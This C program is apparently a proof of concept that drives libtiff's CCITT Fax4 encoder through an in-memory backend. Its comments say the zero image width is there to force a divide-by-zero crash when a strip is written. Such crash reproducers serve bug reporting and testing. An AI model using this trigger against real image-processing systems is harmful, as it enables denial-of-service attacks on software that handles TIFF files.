#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "libtiff/tiffio.h"

/* Simple in-memory file backend for TIFFClientOpen */
typedef struct {
    unsigned char *data;
    toff_t size;
    toff_t cap;
    toff_t off;
} MemFile;

static tmsize_t mem_read(thandle_t client, void *buf, tmsize_t size) {
    MemFile *mf = (MemFile *)client;
    if (mf->off >= mf->size) return 0;
    tmsize_t avail = (tmsize_t)(mf->size - mf->off);
    if (size > avail) size = avail;
    memcpy(buf, mf->data + mf->off, (size_t)size);
    mf->off += size;
    return size;
}

static tmsize_t mem_write(thandle_t client, void const *buf, tmsize_t size) {
    MemFile *mf = (MemFile *)client;
    if (size <= 0) return size;
    toff_t need = mf->off + size;
    if (need > mf->cap) {
        toff_t newcap = mf->cap ? mf->cap : 1024;
        while (newcap < need) newcap *= 2;
        unsigned char *newdata = (unsigned char *)realloc(mf->data, (size_t)newcap);
        if (!newdata) return -1;
        mf->data = newdata;
        mf->cap = newcap;
    }
    memcpy(mf->data + mf->off, buf, (size_t)size);
    mf->off += size;
    if (mf->off > mf->size) mf->size = mf->off;
    return size;
}

static toff_t mem_seek(thandle_t client, toff_t off, int whence) {
    MemFile *mf = (MemFile *)client;
    toff_t newoff = 0;
    switch (whence) {
        case SEEK_SET: newoff = off; break;
        case SEEK_CUR: newoff = mf->off + off; break;
        case SEEK_END: newoff = mf->size + off; break;
        default: return (toff_t)-1;
    }
    if (newoff < 0) return (toff_t)-1;
    mf->off = newoff;
    return mf->off;
}

static int mem_close(thandle_t client) {
    /* Do not free here; caller frees. */
    (void)client;
    return 0;
}

static toff_t mem_size(thandle_t client) {
    MemFile *mf = (MemFile *)client;
    return mf->size;
}

static int mem_map(thandle_t client, void **base, toff_t *size) {
    (void)client; (void)base; (void)size;
    return 0; /* Not supported */
}

static void mem_unmap(thandle_t client, void *base, toff_t size) {
    (void)client; (void)base; (void)size;
}

int main(void) {
    MemFile *mf = (MemFile *)calloc(1, sizeof(MemFile));
    if (!mf) return 1;
    mf->cap = 0;
    mf->data = NULL;
    mf->size = 0;
    mf->off = 0;

    TIFF *tif = TIFFClientOpen("mem", "w", (thandle_t)mf,
                               mem_read, mem_write, mem_seek,
                               mem_close, mem_size, mem_map, mem_unmap);
    if (!tif) {
        fprintf(stderr, "TIFFClientOpen failed\n");
        free(mf);
        return 1;
    }

    /* Set up a CCITTFAX4 image with zero width to make rowbytes == 0 */
    uint32 width = 0;      /* Zero width causes sp->b.rowbytes = 0 */
    uint32 height = 1;     /* At least one row */

    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH, width);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH, height);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE, 1);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, 1);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISWHITE);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP, 1);

    /* Provide a non-zero cc so the encoder is definitely invoked.
       Since rowbytes == 0, cc % rowbytes will divide by zero. */
    unsigned char dummy = 0;
    (void)TIFFWriteEncodedStrip(tif, 0, &dummy, 1);

    TIFFClose(tif);
    free(mf->data);
    free(mf);
    return 0;
}
